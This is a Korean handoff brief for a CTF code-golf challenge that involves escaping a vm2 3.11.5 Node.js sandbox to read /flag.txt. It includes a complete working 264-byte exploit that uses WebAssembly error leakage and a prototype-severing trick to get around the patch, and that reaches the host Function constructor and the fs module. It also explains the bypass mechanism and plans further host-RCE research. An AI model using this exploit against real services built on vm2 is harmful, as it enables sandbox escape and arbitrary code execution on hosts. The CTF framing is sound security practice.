# nodejail (vm2 3.11.5 KotH) — 페이로드 골프 핸드오프

> 이 문서는 DreamHack **King of the Hill** 문제 `nodejail` 의 풀이/최적화 작업을
> 이어받기 위한 기술 브리핑이다. 보안 CTF 과제이며, 목표는 **공개된 vm2 취약점으로
> 샌드박스를 탈출해 `/flag.txt` 를 출력하는 페이로드를 최대한 짧게** 만드는 것(코드 골프).

## 1. 문제 규칙

- 제출물은 `.js` 한 개. 서버가 `new VM({ timeout: 2000 })` (**vm2 3.11.5**) 안에서 실행한다.
- 목표: 샌드박스를 탈출해 `/flag.txt`(44바이트, 후행 개행 없음, 매 라운드 내용 변경)를 읽어
  **stdout 으로 그대로 출력**. 채점은 stdout 만 보고 양끝 공백/개행만 무시(중간은 유효).
- **점수 = 페이로드가 짧을수록 높음.** 라운드별 점수는 바이트 수에 반비례(아래 4절).
- 샌드박스 `console.log` 는 stdout 에 안 나온다 → 출력은 반드시 **호스트** `console.log` 로 해야 함.

## 2. 로컬 재현

```bash
# vm2@3.11.5 설치
npm install            # package.json: { "dependencies": { "vm2": "3.11.5" } }
# runner.js: process.stdin 을 읽어 new VM({timeout:2000}).run(src)
echo 'DH{test}' > flag.txt
sed 's#/flag.txt#flag.txt#g' payload.js | node runner.js   # 로컬은 상대경로로 치환
```

`runner.js`(서버와 동일):
```js
'use strict'
const { VM } = require('vm2')
const src = require('fs').readFileSync(0, 'utf8')
const vm = new VM({ timeout: 2000 })
try { vm.run(src) } catch (e) { process.stderr.write(String((e && e.stack) || e) + '\n') }
```

Node 버전별로 동작이 다르다(3절). 로컬에서 node22 와 node26 **둘 다** 테스트하는 게 좋다.
(node26 바이너리: `https://nodejs.org/dist/v26.0.0/node-v26.0.0-linux-x64.tar.xz`)

## 3. 현재 동작하는 익스 (CVE-2026-47698 / GHSA-cfcw-xp6x-25gj)

vm2 ≤ 3.11.5. **Node 버전 무관**하게 동작. 핵심 아이디어:

1. `WebAssembly.compileStreaming()` 가 **async 로 host-realm 에러**를 던진다(첫 `.catch`).
2. 이중 인다이렉션 호출(`C=c.bind(c)`, `c=Buffer.call`)로 host `__proto__` setter 를 불러,
   그 에러의 **공유 프로토타입의 `[[Prototype]]` 을 null 로 끊는다**(sever).
   - GHSA-v6mx-mf47-r5wg 패치는 위험한 host proto mutator 호출을 apply 트랩에서 막고
     **인다이렉션 한 겹**(call/apply/bind 가 직접 타깃)만 벗겨 검사한다. `c.bind(c)` 는
     *바운드된* call 이라 인다이렉션 프리미티브로 인식되지 않아 한 겹을 더 숨길 수 있다.
     그래서 setter 를 **인자**로 넘기는 `C(setter, proto, null)` 형태가 통과한다.
3. 체인이 끊기면 둘째 `compileStreaming()` 에러는 bridge 가 매핑을 못 찾아 **raw 로 유출**된다.
4. raw host 에러 → `e.toString.constructor` = host `Function` → 태그드 템플릿으로 host 코드 실행
   → `process.(mainModule.require|getBuiltinModule)('fs').readFileSync('/flag.txt')` 출력.

### 현재 최소본

- **`payload.js` = 264 bytes** (실서버 채점 확정). `process.getBuiltinModule('fs')` 사용 →
  **Node ≥ 20.16 / 22.3** 필요. 서버가 이 조건 만족함을 차등 정찰로 확인(아래 7절).
  ```js
  c=Buffer.call;C=c.bind(c);p="__proto__";W=WebAssembly.compileStreaming;W().catch(e=>{C(C(c.__lookupSetter__,c,p),C(C(c.__lookupGetter__,c,p),e),null);W().catch(e=>e.toString.constructor`console.log(process.getBuiltinModule('fs').readFileSync('/flag.txt')+'')`())})
  ```
- **`payload-safe.js` = 266 bytes** (버전무관 폴백). `process.mainModule.require('fs')`.

### 골프 기록
`335 → 333 → 320 → 311 → 309 → 308 → 295 → 291 → 284 → 276 → 271 → 269 → 266 → 264`

## 4. 점수 분석 — 왜 라운드당 점수가 낮은가 (★ 최우선 과제)

점수는 맞췄냐가 아니라 **페이로드 길이에 반비례**한다. 라운드 만점이 20 이라면 대략
`내점수 ≈ 20 × (최단_페이로드 / 내_페이로드)`. 관측값 **우리 5 / 선두 20 = 1:4** →
**선두 팀 페이로드 ≈ 우리(264B)의 1/4 ≈ 66 바이트.**

즉 **~66바이트짜리 익스가 존재**하며, 264B(WASM 기법)로는 점수를 1/4 밖에 못 받는다.
WASM 기법은 sever(4회 론더링)+이중 트리거+Function 생성자 때문에 구조적으로 ~260B 가 바닥.
**훨씬 짧은 건 구조가 다른 익스여야 한다.**

## 5. 목표와 유력 경로 — Node-26 전용 익스 (CVE-2026-92944)

README/분석상 더 짧은 길은 **Node 26 전용** 경로:
**async + stack overflow**, WASM/Buffer/sever **불필요**. 스택을 정밀한 깊이로 소진시켜
**호스트 bridge 코드 내부에서 RangeError 를 터뜨려** raw host 에러를 유출하는 방식으로 추정.
성공 시 `rawErr.constructor.constructor('return process')()...` 혹은 태그드 템플릿으로
`~60-90B` 가능할 것으로 보임.

- 서버는 `getBuiltinModule` 지원(Node ≥ 20.16) 확인됨. **26 인지까지는 미확인**이나
  선두 66B 정황상 서버가 그 짧은 익스가 먹히는 버전일 가능성이 높다.
- bridge.js 주석: *"This is done to ensure that RangeErrors are from the correct context.
  The boundary between the sandbox and host might throw RangeErrors from both contexts."*
  → RangeError 양 realm 처리 로직이 공격면. 호스트 쪽에서 던져진 RangeError 를
  정화 없이 샌드박스로 흘리는 조건을 찾는 게 핵심.

## 6. 지금까지 시도한 막다른 길 (전부 로컬 실측)

**node22 + vm2 3.11.5**
- 고전 `[]/this/''/global/Function .constructor.constructor('return process')()` → 전부
  **샌드박스 Function** 으로 정화("process is not defined"). 패치됨.
- `@@species` + async 스택오버플로우(leesh3288 계열) → **타임아웃**(패치됨).
- 동적 `import()` → 비활성(`Dynamic Import not supported`, 샌드박스 VMError).
- `WebAssembly.compile`/`instantiate`(compileStreaming 대신) → raw 유출 실패.
- `Buffer` 외 짧은 전역(`Set/Map/URL/Date/Error/Proxy/Reflect/globalThis` 등 15개) `.call`
  → host call 유출 **안 됨**. `Buffer` 만 통과.
- bind 로 setter 직접 호출(`setter.bind(proto,null)()`) → one-layer peel 에 **차단**.
- sever 에서 getter 생략하고 `e` 직접 → 인스턴스 proto 라 공유 proto 안 끊김(실패).
- host Function 스코프에 bare `require`/`global.require` 없음.
- `e.valueOf.constructor` 동작 안 함(`e.toString.constructor` 는 됨, -3B).

**node26 + vm2 3.11.5** (짧은 익스 탐색 중, 아직 미성공)
- naive 재귀/`async g(){return g()}`/`Promise.then(g=>g())`/스택오버플로우 →
  reject 콜백은 실행되나 `e.constructor.constructor` 가 여전히 **샌드박스 Function**.
- `Error.prepareStackTrace=(_,c)=>c` 로 CallSite 배열은 얻으나 `getThis()` 가 호스트 유출 안 함.
- → CVE-2026-92944 는 단순 재귀가 아니라 **스택 깊이를 정밀 조정해 호스트 경계에서**
  RangeError 를 터뜨리는 형태로 보임. 공개 PoC/원문 분석 필요.

## 7. 제출 / 정찰 메커니즘

- 엔드포인트: `POST /login`(JSON `{token}`, 쿠키 세션) → `POST /submit`(multipart, field `file`,
  filename `payload.js`) → `GET /me/submissions`.
- **채점은 비동기**(`status: queued` → `ready`/`rejected`). 응답에 payload stdout 은 안 담김
  → "버전을 출력시켜 읽는" 정찰은 불가.
- **거부 사유 2종으로 차등 정찰 가능**:
  - `output did not match the expected transform` = 실행은 됐고 출력만 틀림.
  - `payload exited with an error before producing output` = 실행 중 에러.
  → 264B(getBuiltinModule) 제출이 `ready` 면 지원, `error before output` 이면 미지원.
- **중요**: `rejected` 제출은 **활성(랭킹) 제출을 대체하지 않는다**(관측 확인). 따라서
  **서버를 테스트 오라클로 써도 안전** — 후보 익스를 제출해 `ready`/`rejected`/`error` 로
  서버 실 Node 동작을 역산할 수 있다(제출 상한 `max_submissions=50` 주의).

## 8. 파일

- `payload.js` (264B, 확정 최소), `payload-safe.js` (266B, 버전무관)
- `runner.js`, `package.json`, `flag.txt` (로컬 재현), `test.sh`
- `recon.js` (호스트 process 정보 출력 정찰 페이로드)
- 제출/상태 도구: `submit.py`, `koth.py`(파이썬), `koth.bat`/`test264.bat`(윈도우, 파이썬 불필요)

## 9. 다음 작업 제안 (우선순위)

1. **CVE-2026-92944 PoC 확보/재현** (node26). vm2 3.11.5 `bridge.js` 의 RangeError 양-realm
   처리에서, 호스트 스택이 먼저 터지도록 깊이를 맞춘 뒤 bridge 경유 호출을 유발 →
   raw host 에러 유출 → `constructor.constructor` 로 host Function → RCE. 목표 ~60-90B.
2. 서버가 실제로 node26 인지 §7 차등 정찰로 확정(26 전용 API 유무 제출 테스트).
3. 성공 시 RCE 본문은 현재와 동일(`process.getBuiltinModule('fs').readFileSync('/flag.txt')+''`).
